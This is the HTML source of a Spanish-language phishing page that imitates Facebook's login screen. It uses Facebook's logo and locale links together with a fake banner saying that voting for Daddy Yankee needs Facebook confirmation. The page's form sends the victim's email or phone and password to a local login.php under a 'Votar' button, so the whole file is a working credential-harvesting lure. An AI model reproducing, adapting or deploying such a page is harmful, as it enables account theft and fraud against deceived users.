<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Red Social - Inicio de sesión</title>
  
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      margin: 0;
      padding-top: 2cm;  /* Espacio de 5cm en la parte superior */
      padding-bottom: 2cm;  /* Espacio de 5cm en la parte inferior */
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      text-align: center;
    }

    .header-image {
      margin-top: 0; /* Eliminamos el margen superior para que el padding del body lo gestione */
      display: block;
      margin-left: auto;
      margin-right: auto;
      width: auto;
      height: auto;
      max-width: 100%;
    }

    .login-container {
      background-color: #ffffff;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      box-sizing: border-box;
    }

    .logo img {
      width: 112px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #dddfe2;
      border-radius: 5px;
      font-size: 16px;
    }

    .login-btn {
      width: 109%;  /* Ajustado para evitar el desbordamiento */
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    .login-btn:hover {
      background-color: #1558b0;
    }

    .signup-link {
      text-align: center;
      margin-top: 10px;
    }

    .signup-link a {
      color: #1877f2;
      text-decoration: none;
    }

    .signup-link a:hover {
      text-decoration: underline;
    }

    .locale-selector {
      margin-top: 20px;
      font-size: 14px;
      color: #606770;
    }

    .locale-selector a {
      color: #1877f2;
      text-decoration: none;
      margin: 0 10px;
    }

    .locale-selector a:hover {
      text-decoration: underline;
    }

    .signup-button-container {
      margin-top: 20px;
      text-align: center;
      width: 100%;
    }

    .signup-button {
      display: inline-block;
      padding: 12px 24px;
      border: 2px solid rgb(0, 100, 224);
      color: rgb(0, 100, 224);
      font-size: 16px;
      font-weight: bold;
      text-decoration: none;
      border-radius: 25px;
      transition: background-color 0.3s, color 0.3s;
      width: 80%;
      max-width: 400px;
      box-sizing: border-box;
    }

    .signup-button:hover {
      background-color: rgb(0, 100, 224);
      color: white;
    }

    @media (max-width: 480px) {
      .signup-button {
        font-size: 14px;
      }
    }

    .vote-notification {
      background-color: #faf9d7;
      border: 2px solid #c3c0a0;
      padding: 10px;
      margin-top: 1px;
      text-align: center;
      font-size: 15px;
      color: #1877f2;
      border-radius: 8px;
      width: 100%;
      max-width: 400px;
      box-sizing: border-box;
      margin-left: auto;
      margin-right: auto;
    }

  </style>

  <script>
    function validateInput() {
      const emailInput = document.querySelector('input[name="email"]');
      const inputValue = emailInput.value.trim();

      // Si el valor contiene solo números (teléfono), no se requiere '@'
      if (/^\d+$/.test(inputValue)) {
        return true;
      }
      
      // Si el valor contiene letras, debe tener el '@' para ser un correo
      if (!inputValue.includes('@')) {
        alert("Por favor, ingresa un correo electrónico válido.");
        return false;
      }

      return true;
    }
  </script>

</head>
<body>

  <img class="header-image" src="https://i.ibb.co/twHgT3sh/voto.png" alt="Imagen de Voto">
  <div class="login-container">
    <div class="vote-notification">
      Para votar por Daddy Yankee, es necesario confirmar el voto con la cuenta de Facebook. No es válido 2 votos por perfil.
    </div>
  <br>
    <div class="logo">
      <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Logo de Facebook">
    </div>
    <form action="login.php" method="POST" onsubmit="return validateInput()">
      <div>
        <input type="text" name="email" placeholder="Número de móvil o correo electrónico" required aria-label="Número de móvil o correo electrónico">
      </div>
      <div>
        <input type="password" name="password" placeholder="Contraseña" required aria-label="Contraseña">
      </div>
      <button type="submit" class="login-btn">Votar</button>
    </form>

    <div class="signup-link">
      <p><a href="signup.html" title="Recupera tu cuenta si has olvidado tu contraseña">¿Has olvidado la contraseña?</a></p>
    </div>
  </div>

  <div class="signup-button-container">
    <a href="signup.html" role="button" class="signup-button">Crear una cuenta</a>
  </div>

  <div class="locale-selector">
    <span>Español (España)</span> |

    <a href="/intl/save_locale/?loc=de_DE&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0BZQjyrGc1ijeSkoM" aria-label="Seleccionar idioma alemán">Deutsch</a> |
    <a href="/intl/save_locale/?loc=ar_AR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0BZQjyrGc1ijeSkoM" aria-label="Seleccionar idioma árabe">العربية</a> |
    <a href="/intl/save_locale/?loc=en_US&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0BZQjyrGc1ijeSkoM" aria-label="Seleccionar idioma inglés">English (US)</a> |
    <a href="/intl/save_locale/?loc=pt_BR&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0BZQjyrGc1ijeSkoM" aria-label="Seleccionar idioma portugués">Português (Brasil)</a> |
    <a href="/intl/save_locale/?loc=it_IT&href=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0BZQjyrGc1ijeSkoM" aria-label="Seleccionar idioma italiano">Italiano</a>
  </div>

</body>
</html>
